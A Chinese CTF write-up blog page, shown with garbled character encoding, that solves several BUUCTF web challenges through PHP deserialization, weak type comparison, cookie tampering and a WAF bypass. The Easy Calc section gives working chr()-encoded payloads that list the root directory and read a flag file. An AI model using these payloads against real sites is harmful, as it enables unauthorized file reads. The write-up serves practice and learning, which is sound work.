<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h2><p>ä»é¢˜ç›®ä¸Šæ¥çœ‹è¿™æ˜¯ä¸€é“phpçš„é¢˜ç›®ï¼Œé¦–é¡µæ˜¾ç¤ºå­˜åœ¨å¤‡ä»½ç½‘ç«™çš„ä¹ æƒ¯<br><img src="https://img-blog.csdnimg.cn/f4e9a9f0e8dc42e8bbc1e56acfa88747.png" alt="1"><br>ç„¶åå°±äº†è§£ä¸€ä¸‹å¸¸è§å¤‡ä»½æ–‡ä»¶æœ‰å“ªäº›åç¼€åï¼Ÿ</p>
<blockquote>
<p>å¸¸è§çš„å¤‡ä»½æ–‡ä»¶åç¼€åï¼šâ€œ.gitâ€ ã€â€œ.svnâ€ã€â€œ .swpâ€ â€œ.~â€ã€â€œ.bakâ€ã€â€œ.bash_historyâ€ã€â€œ.bkfâ€</p>
</blockquote>
<p>å¯ä»¥ç”¨<strong>dirsearch</strong>æ‰«ä¸€ä¸‹</p>
<blockquote>
<p>ä½¿ç”¨</p>
</blockquote>
<blockquote>
<p>-u æŒ‡å®šurl</p>
</blockquote>
<blockquote>
<p>-e æŒ‡å®šç½‘ç«™è¯­è¨€</p>
</blockquote>
<blockquote>
<p>-w å¯ä»¥åŠ ä¸Šè‡ªå·±çš„å­—å…¸ï¼ˆå¸¦ä¸Šè·¯å¾„ï¼‰</p>
</blockquote>
<blockquote>
<p>-r é€’å½’è·‘ï¼ˆæŸ¥åˆ°ä¸€ä¸ªç›®å½•åï¼Œåœ¨ç›®å½•ååœ¨é‡å¤è·‘ï¼Œå¾ˆæ…¢ï¼Œä¸å»ºè®®ç”¨ï¼‰</p>
</blockquote>
<p>è¿›å…¥dirsearchç›®å½•å</p>
<p>æ‰§è¡Œ.&#x2F;dirsearch.py -u 127.0.0.1 -e phpç±»ä¼¼çš„ç›®å½•</p>
<p>è¿™é‡Œå°±ä¸æ‰«æäº†ï¼Œæœ€åæ‰«æåˆ°<a href="http://www.zip,åœ¨åç¼€åŠ ä¸Šä»–ä¹‹åä¿å­˜æ–‡ä»¶/">www.zipï¼Œåœ¨åç¼€åŠ ä¸Šä»–ä¹‹åä¿å­˜æ–‡ä»¶</a><br><img src="https://img-blog.csdnimg.cn/d8843158602b47acac1b90a490dcd436.png" alt="2"><br>å¾—åˆ°5ä¸ªæ–‡ä»¶ã€‚</p>
<blockquote>
<p>class.phpæ–‡ä»¶</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>


<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">class</span> <span class="token class-name-definition class-name">Name</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>NO!!!hacker!!!&lt;/br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You name is: "</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You password is: "</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!"</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œä¸»è¦æ„æ€å°±æ˜¯å½“<strong>username</strong>å¼ºç›¸ç­‰äº<strong>admin</strong>ï¼Œ<strong>password</strong>å¼±ç›¸ç­‰äº<strong>100</strong>æ—¶ç»™å‡ºflagï¼Œä½†æ˜¯éœ€è¦æ³¨æ„ä¸€ç‚¹çš„å°±æ˜¯ç¨‹åºåœ¨æ‰§è¡Œæ—¶ï¼Œä¼šå°†<strong>username</strong>èµ‹å€¼ä¸º<strong>guest</strong>ï¼Œè¿™æ„å‘³ç€ä¸èƒ½å¾—å‡ºflagã€‚å…ˆæ”¾åœ¨è¿™é‡Œï¼Œçœ‹çœ‹å…¶ä»–æ–‡ä»¶ã€‚</p>
<blockquote>
<p>index.phpæ–‡ä»¶</p>
</blockquote>
<p>å…¶ä¸­æœ‰ä¸€æ®µå†…å®¹ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token keyword">include</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span>
    <span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'select'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æˆ‘ä»¬é€šè¿‡getè¯·æ±‚ä¼ å…¥selectå‚æ•°ï¼Œå¹¶ä¸”å€¼è¢«ååºåˆ—åŒ–äº†ï¼ˆ<strong>unserialize</strong>ï¼‰</p>
<p>å®åœ¨ä¸ä¼šäº†ï¼Œå†™é¢˜æ­¥éª¤è¯·å‚è€ƒ<a href="https://zhuanlan.zhihu.com/p/366455343">è¿™ä½å¸ˆå‚…</a></p>
<h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><p><strong>phpåºåˆ—åŒ–å¯¹è±¡å‚è€ƒè§„åˆ™</strong></p>
<blockquote>
<p>O:4:â€Userâ€:2:{s:3:â€ageâ€;i:20;s:4:â€nameâ€;s:4:â€dayeâ€;}<br>å¯¹è±¡ç±»å‹:é•¿åº¦:â€ç±»åâ€:ç±»ä¸­å˜é‡çš„ä¸ªæ•°:{ç±»å‹:é•¿åº¦:â€å€¼â€;ç±»å‹:é•¿åº¦:â€å€¼â€;â€¦â€¦}<br>å˜é‡åŠå¯¹è±¡ç±»å‹å‚è€ƒ<br>a - array         b - boolean<br>d - double         i - integer<br>o - common object     r - reference<br>s - string         C - custom object<br>O - class         N - null<br>R - pointer reference   U - unicode string</p>
</blockquote>
<p><strong>private å£°æ˜çš„å­—æ®µåœ¨åºåˆ—åŒ–æ—¶ï¼Œéœ€è¦æ³¨æ„ï¼š</strong></p>
<blockquote>
<p>   privateå£°æ˜çš„å­—æ®µä¸ºç§æœ‰å­—æ®µï¼Œåªåœ¨æ‰€å£°æ˜çš„ç±»ä¸­å¯è§ï¼Œåœ¨è¯¥ç±»çš„å­ç±»å’Œè¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­å‡ä¸å¯è§ã€‚<br>   å› æ­¤ç§æœ‰å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œç±»åå’Œå­—æ®µåå‰é¢éƒ½ä¼šåŠ ä¸Š\0ï¼ˆå³%00ï¼‰çš„å‰ç¼€ã€‚å­—ç¬¦ä¸²é•¿åº¦ä¹ŸåŒ…æ‹¬æ‰€åŠ å‰ç¼€çš„é•¿åº¦ï¼Œå¦‚ä¸‹</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"User"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00User%00age"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00User%00name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"daye"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token comment"># 9=7+2  10=8+2  å…¶ä¸­2ä¸ºä¸¤ä¸ªå‰ç¼€</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><a href="https://www.php.net/manual/zh/language.oop5.magic.php">é­”æœ¯æ–¹æ³•</a></p>
<blockquote>
<p>ä¸‹åˆ—æ–¹æ³•åè¢«è®¤ä¸ºæ˜¯é­”æœ¯æ–¹æ³•ï¼š __construct() ã€ __destruct() ã€ __call() ã€ __callStatic() ã€ __get() ã€ __set() ã€ __isset() ã€ __unset() ã€ __sleep() ã€ __wakeup() ã€ __serialize() ã€ __unserialize() ã€ __toString() ã€ __invoke() ã€ __set_state() ã€ __clone() ã€ __debugInfo() ã€‚ </p>
</blockquote>
<p><strong>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ç®€å•ä»‹ç»</strong></p>
<blockquote>
<p>åºåˆ—åŒ–:æŠŠå¤æ‚çš„æ•°æ®ç±»å‹å‹ç¼©åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ æ•°æ®ç±»å‹å¯ä»¥æ˜¯æ•°ç»„ï¼Œå­—ç¬¦ä¸²ï¼Œå¯¹è±¡ç­‰  å‡½æ•° : serialize()</p>
</blockquote>
<blockquote>
<p>ååºåˆ—åŒ–:æ¢å¤åŸå…ˆè¢«åºåˆ—åŒ–çš„å˜é‡ å‡½æ•°: unserialize()</p>
</blockquote>
<h2 id="ACTF2020-æ–°ç”Ÿèµ›-BackupFile"><a href="#ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h2><p>æ‰“å¼€é¢˜ç›®åæ˜¯çœŸçš„å¹²å‡€ï¼Œæ²¡æœ‰ä¸€ç‚¹ä¿¡æ¯ã€‚æ²¡æœ‰æ³¨æ„åˆ°çš„ä¸€ç‚¹å°±æ˜¯é¢˜ç›®åç§°ï¼<strong>backup file</strong>ä¸­æ–‡æ„æ€å°±æ˜¯<strong>å¤‡ä»½æ–‡ä»¶</strong>è¯´æ˜å­˜åœ¨å¤‡ä»½æ–‡ä»¶ã€‚</p>
<blockquote>
<p>ç½‘ç«™å¤‡ä»½å‹ç¼©æ–‡ä»¶<br>.rar<br>.zip<br>.7z<br>.tar.gz<br>.bak<br>.swp<br>.txt<br>.html</p>
</blockquote>
<p>æ‹¿dirsearchæ‰«ä¸€ä¸‹<br><img src="https://img-blog.csdnimg.cn/9acc437c03744836b70d8748bf4d6199.png" alt="1"><br>éœ€è¦ç­‰å¾…ä¸€ä¸ªæ¼«é•¿çš„æ—¶é—´<img src="https://img-blog.csdnimg.cn/78f243565bdf4940bebebe089d87d9a0.png" alt="2"><br>æœ€åæ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶ä¿å­˜ä¸‹æ¥å¾—åˆ°ä»¥ä¸‹å†…å®¹ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include_once</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Just num!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">==</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Try to find out source file!"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å°±æ˜¯å¼±ç±»å‹çš„é—®é¢˜ï¼Œ<br><img src="https://img-blog.csdnimg.cn/af49efe60a034006a4f3db1994dacea2.png" alt="3"><br>å¾—åˆ°flagï¼š<code>flag&#123;d21c38ea-d364-4047-a47c-4527c09a3937&#125; </code></p>
<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p><img src="https://img-blog.csdnimg.cn/7dbc9a95029643b6ac0fbaa2bc5acc41.png" alt="1"><br>æŸ¥çœ‹æºç <br><img src="https://img-blog.csdnimg.cn/67df4dfceb3343c0b3ab1ee039933a14.png" alt="1"><br>æœ‰ä¸ªurlæç¤ºï¼š<code>calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val())</code></p>
<blockquote>
<p>$(â€œ#contentâ€).val() æ˜¯ä»€ä¹ˆæ„æ€ï¼š<br>è·å–idä¸ºcontentçš„HTMLæ ‡ç­¾å…ƒç´ çš„å€¼,æ˜¯JQuery, $(â€œ#contentâ€)ç›¸å½“äºdocument.getElementById(â€œcontentâ€); $(â€œ#contentâ€).val()ç›¸å½“äº document.getElementById(â€œcontentâ€).value;</p>
</blockquote>
<p>çœ‹ä¸€ä¸‹calc.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\$'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>http://node4.buuoj.cn:28863/calc.php?num=1</code><br>æœ‰å›æ˜¾<br><code>http://node4.buuoj.cn:28863/calc.php?num=a</code><br>æ— å›æ˜¾<br><img src="https://img-blog.csdnimg.cn/beaf25ecc9db463c87bdc14b7f82bd47.png" alt="2"><br>ç”±äºåç»­æˆ‘ä»¬è¦æ‰¾çš„flagè‚¯å®šå¸¦å­—æ¯<br>æ— è®ºæ€ä¹ˆæ³¨å…¥éƒ½æ˜¯è¢«WAFäº†ã€‚çœ‹äº†ä¸€ä¸‹å¸ˆå‚…ä»¬çš„æ–‡ç« ï¼Œè¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹<a href="https://blog.csdn.net/qq_45521281/article/details/105871192">åˆ©ç”¨PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡Waf</a></p>
<blockquote>
<p>PHPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š</p>
<p>1.åˆ é™¤å‰åçš„ç©ºç™½ç¬¦ï¼ˆç©ºæ ¼ç¬¦ï¼Œåˆ¶è¡¨ç¬¦ï¼Œæ¢è¡Œç¬¦ç­‰ç»Ÿç§°ä¸ºç©ºç™½ç¬¦ï¼‰<br>2.å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰</p>
</blockquote>
<p>numè¢«é™åˆ¶äº†ï¼Œä½†åœ¨numå‰é¢åŠ ä¸ªç©ºæ ¼ï¼Œwafå°±ç®¡ä¸ç€äº†ï¼Œå› ä¸ºwafåªæ˜¯é™åˆ¶äº†numï¼Œwafå¹¶æ²¡æœ‰é™åˆ¶â€™ numâ€™ï¼Œå½“phpè§£æçš„æ—¶å€™ï¼Œåˆä¼šæŠŠâ€™ numâ€™å‰é¢çš„ç©ºæ ¼å»æ‰åœ¨è§£æï¼Œåˆ©ç”¨è¿™ç‚¹æ¥ä¸Šä¼ éæ³•å­—ç¬¦<br>å½“æŸ¥æ‰¾æ ¹ç›®å½•æ–‡ä»¶æ—¶è¦ç”¨åˆ°<code>print_r(scandir(&#39;/&#39;))c</code><br>ä»calc.phpå¯ä»¥çœ‹å‡º<code>&quot;``&#39;</code>è¢«è¿‡æ»¤äº†ï¼Œè¿™æ˜¯è¦æƒ³åˆ°ç”¨ASCIIç </p>
<p><code>http://node4.buuoj.cn:28863/calc.php? num=print_r(scandir(chr(47)))</code><br><img src="https://img-blog.csdnimg.cn/48e5899d3e6f42f497fdd879518a8090.png" alt="4"><br>åœ¨flagåœ¨f1aggæ–‡ä»¶ä¸­<br>å¯¹ç…§ASCIIç è¡¨å†™å…¥<br><code>http://node4.buuoj.cn:28863/calc.php? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code><br>å¾—åˆ°flag.<br><strong>flag{c7fa0f73-f1a2-4d7c-b3bb-ea6c6da4697c}</strong></p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h2><p><img src="https://img-blog.csdnimg.cn/2d6553026ec84e11a2b51bc17eff592e.png" alt="1"><img src="https://img-blog.csdnimg.cn/282f01c25350408ebbe4e522ade24a94.png" alt="5"></p>
<p><img src="https://img-blog.csdnimg.cn/d46d326609cb44ba90c146463434cf9b.png" alt="2"><br>æ€ä¹ˆæ‰èƒ½è¯æ˜ä½ æ˜¯ä¸€åå­¦ç”Ÿå‘¢ï¼Ÿcookieä¸­æœ‰ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/19e411b9ed5d45e4a654dc8ab5c55c5b.png" alt="3"><br>0æ”¹ä¸º1<br><img src="https://img-blog.csdnimg.cn/72e319f95be24bedbac48dce902169b1.png" alt="5"><br>å¯†ç æ˜¯ä»€ä¹ˆï¼ŸæŸ¥çœ‹æºç <br><img src="https://img-blog.csdnimg.cn/0a9b22d22ae943a6a0a262c6586a4189.png" alt="6"><strong>&#x3D;&#x3D;<strong>å¼±ç›¸ç­‰æ¯”è¾ƒï¼Œpostä¼ å‚ï¼š<br><img src="https://img-blog.csdnimg.cn/85f4ea6e2307467993ae5c0da4f24a12.png" alt="7"><br>ç§‘å­¦è®¡æ•°æ³•1e9<br><img src="https://img-blog.csdnimg.cn/a233cb5e10da40559fb2e04d30af20a2.png" alt="8"><br>æˆ–è€…æ•°ç»„ç»•è¿‡</strong>password&#x3D;404jk&amp;money[]&#x3D;1000000000;</strong><a href="https://blog.csdn.net/cherrie007/article/details/77473817">strcmpå‡½æ•°æ¼æ´</a></p>
<h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialzï¼ˆphpååºåˆ—åŒ–ï¼‰"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialzï¼ˆphpååºåˆ—åŒ–ï¼‰" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialzï¼ˆphpååºåˆ—åŒ–ï¼‰"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialzï¼ˆphpååºåˆ—åŒ–ï¼‰</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>  <span class="token comment">//protected: å—ä¿æŠ¤ç±»å‹</span>
    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>
        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Hello World!"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
